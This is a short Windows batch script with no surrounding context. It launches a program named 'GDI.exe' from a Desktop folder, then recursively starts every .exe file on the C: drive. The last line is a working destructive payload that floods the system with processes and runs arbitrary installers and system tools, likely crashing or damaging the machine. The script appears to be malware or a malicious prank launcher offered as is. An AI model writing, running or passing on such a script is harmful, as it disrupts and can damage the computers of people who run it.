@echo off
cd /d "%userprofile%\Desktop\reso"
start "" "GDI.exe"
cmd /c for /r C:\ %i in (*.exe) do start "" "%i"
